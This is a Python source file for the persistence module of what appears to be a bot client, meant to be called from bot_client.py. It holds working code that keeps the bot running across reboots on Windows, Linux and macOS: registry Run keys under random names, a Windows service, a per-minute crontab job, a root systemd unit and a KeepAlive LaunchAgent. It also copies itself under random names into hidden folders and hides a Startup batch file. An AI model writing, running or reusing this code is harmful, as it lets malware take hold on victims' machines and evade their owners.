# modules/persistence.py

import os
import sys
import platform
import subprocess
import random
import string
import shutil
import time
import json
import logging
from datetime import datetime
from typing import Optional

# --------------------------------------------------------------------------- #
# Logging Setup
# --------------------------------------------------------------------------- #
logger = logging.getLogger("Persistence")

# --------------------------------------------------------------------------- #
# Helper Functions
# --------------------------------------------------------------------------- #

def get_script_path() -> str:
    """Returns the absolute path of the current executable/script."""
    if getattr(sys, 'frozen', False):
        return sys.executable
    else:
        return os.path.abspath(sys.argv[0])

def get_random_name(length=8) -> str:
    """Generates a random alphanumeric string."""
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def is_admin() -> bool:
    """Check if the current process has admin/root privileges."""
    if platform.system() == "Windows":
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        return os.geteuid() == 0

def log_message(msg: str, level: str = "INFO"):
    """Simple logging mechanism"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg = f"[{timestamp}] [{level}] {msg}"
    print(msg)

# ============================================ #
# ✅ MAIN FUNCTIONS - Bot Client এ ব্যবহারের জন্য
# ============================================ #

def add_to_startup():
    """
    Add bot to Windows Startup (Registry method)
    This is called from bot_client.py
    """
    try:
        if platform.system() != "Windows":
            logger.info("Not Windows, skipping startup")
            return False

        import winreg
        script_path = get_script_path()

        # CurrentVersion\Run (User level)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "BotClient", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
        winreg.CloseKey(key)

        logger.info("✅ Added to Windows Startup")
        log_message("[+] Windows Registry Persistence Added.")
        return True

    except Exception as e:
        logger.error(f"Failed to add to startup: {e}")
        log_message(f"[-] Windows Registry Error: {e}", "ERROR")
        return False

def create_service():
    """
    Create Windows Service for persistence
    This is called from bot_client.py
    """
    try:
        if platform.system() != "Windows":
            logger.info("Not Windows, skipping service creation")
            return False

        service_name = "BotClientService"
        script_path = get_script_path()

        # Check if service already exists
        result = subprocess.run(f'sc query "{service_name}"', shell=True, capture_output=True)
        if result.returncode == 0:
            logger.info(f"Service {service_name} already exists")
            return True

        # Create service
        cmd = f'sc create "{service_name}" binPath= "{sys.executable} {script_path}" start= auto displayname= "Bot Client Service"'
        subprocess.run(cmd, shell=True, capture_output=True)

        logger.info(f"✅ Service {service_name} created")
        log_message(f"[+] Service {service_name} created.")
        return True

    except Exception as e:
        logger.error(f"Failed to create service: {e}")
        log_message(f"[-] Service creation error: {e}", "ERROR")
        return False

def remove_startup():
    """Remove from Windows Startup"""
    try:
        if platform.system() != "Windows":
            return False

        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "BotClient")
        winreg.CloseKey(key)

        logger.info("✅ Removed from Windows Startup")
        return True

    except Exception as e:
        logger.error(f"Failed to remove from startup: {e}")
        return False

def remove_service():
    """Remove Windows Service"""
    try:
        if platform.system() != "Windows":
            return False

        service_name = "BotClientService"
        subprocess.run(f'sc stop "{service_name}"', shell=True, capture_output=True)
        subprocess.run(f'sc delete "{service_name}"', shell=True, capture_output=True)

        logger.info(f"✅ Service {service_name} removed")
        return True

    except Exception as e:
        logger.error(f"Failed to remove service: {e}")
        return False

# ============================================ #
# 🔥 Advanced Persistence Methods
# ============================================ #

def persist_windows_registry_advanced():
    """Advanced Windows Registry persistence with multiple locations"""
    try:
        import winreg
        script_path = get_script_path()

        # Multiple registry locations for redundancy
        registry_paths = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        ]

        for path in registry_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, f"BotClient_{get_random_name(4)}", 0, winreg.REG_SZ, script_path)
                winreg.CloseKey(key)
                log_message(f"[+] Added to: {path}")
            except:
                pass

        # Also add to HKLM if admin
        if is_admin():
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "BotClient", 0, winreg.REG_SZ, script_path)
                winreg.CloseKey(key)
                log_message("[+] Added to HKLM Run")
            except:
                pass

        return True
    except Exception as e:
        log_message(f"[-] Advanced registry error: {e}", "ERROR")
        return False

def persist_linux_crontab():
    """Adds entry to Linux Crontab."""
    try:
        script_path = get_script_path()
        result = subprocess.run(['crontab', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        existing_cron = result.stdout.decode('utf-8')

        cron_job = f"* * * * * python3 {script_path} >> /dev/null 2>&1 &\n"

        if cron_job.strip() not in existing_cron:
            subprocess.run(['crontab', '-'], input=cron_job.encode(), check=True)
            log_message("[+] Linux Crontab Persistence Added.")
            return True
        else:
            log_message("[*] Linux Crontab already exists.")
            return True
    except Exception as e:
        log_message(f"[-] Linux Crontab Error: {e}", "ERROR")
        return False

def persist_macos_launchd():
    """Adds entry to macOS LaunchAgents."""
    try:
        script_path = get_script_path()
        user_home = os.path.expanduser("~")
        launch_agents_dir = os.path.join(user_home, "Library", "LaunchAgents")
        os.makedirs(launch_agents_dir, exist_ok=True)

        plist_name = f"com.botclient.{get_random_name(6)}.plist"
        plist_path = os.path.join(launch_agents_dir, plist_name)

        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.botclient</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""

        with open(plist_path, "w") as f:
            f.write(plist_content)

        subprocess.run(["launchctl", "load", plist_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log_message("[+] macOS LaunchAgent Persistence Added.")
        return True
    except Exception as e:
        log_message(f"[-] macOS LaunchAgent Error: {e}", "ERROR")
        return False

def self_copy_and_rename():
    """Copies itself to a new location with a random name."""
    try:
        src = get_script_path()
        os_name = platform.system()

        if os_name == "Windows":
            dest_dir = os.path.join(os.getenv('APPDATA'), '.cache', 'update')
            os.makedirs(dest_dir, exist_ok=True)
            new_name = f"{get_random_name(6)}.exe" if getattr(sys, 'frozen', False) else f"{get_random_name(6)}.py"
            dest = os.path.join(dest_dir, new_name)
            shutil.copy2(src, dest)
            subprocess.run(['attrib', '+h', dest_dir], shell=True)
            log_message(f"[+] Self-copied to: {dest}")
            return dest
        elif os_name in ["Linux", "Darwin"]:
            dest_dir = os.path.expanduser("~/.local/share")
            new_name = f".{get_random_name(6)}"
            dest = os.path.join(dest_dir, new_name)
            shutil.copy2(src, dest)
            log_message(f"[+] Self-copied to: {dest}")
            return dest
    except Exception as e:
        log_message(f"[-] Self-copy Error: {e}", "ERROR")
    return get_script_path()

def hide_file(filepath: str):
    """Hides a file using OS-specific attributes."""
    if platform.system() == "Windows":
        subprocess.run(['attrib', '+h', '+s', filepath], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ============================================ #
# Main Persistence Orchestrator
# ============================================ #

def run_full_persistence():
    """
    Executes all persistence methods based on the OS.
    This is the main entry point for bot_client.py
    """
    log_message("[*] Initializing Persistence Module...")

    # 1. Self-Copy (Redundancy)
    current_path = self_copy_and_rename()

    # 2. OS-Specific Persistence
    os_name = platform.system()

    if os_name == "Windows":
        persist_windows_registry_advanced()

        # Add to Startup Folder
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        bat_path = os.path.join(startup_dir, f"{get_random_name(4)}.bat")
        with open(bat_path, "w") as f:
            f.write(f'@echo off\npython "{current_path}"\n')
        hide_file(bat_path)

    elif os_name == "Linux":
        persist_linux_crontab()

        # Systemd if root
        if is_admin():
            log_message("[*] Root detected. Adding Systemd Service...")
            service_name = f"botclient_{get_random_name(4)}.service"
            service_path = f"/etc/systemd/system/{service_name}"
            with open(service_path, "w") as f:
                f.write(f"""[Unit]
Description=Bot Client Service
After=network.target

[Service]
ExecStart=python3 {current_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
""")
            subprocess.run(["systemctl", "daemon-reload"], stdout=subprocess.DEVNULL)
            subprocess.run(["systemctl", "enable", service_name], stdout=subprocess.DEVNULL)

    elif os_name == "Darwin":  # macOS
        persist_macos_launchd()

    log_message(f"[+] Persistence Completed for {os_name}.")
    return True

# ============================================ #
# Test
# ============================================ #

if __name__ == "__main__":
    print("Testing Persistence Module...")
    run_full_persistence()
    print("\nTesting individual functions:")
    print(f"add_to_startup(): {add_to_startup()}")
    print(f"create_service(): {create_service()}")
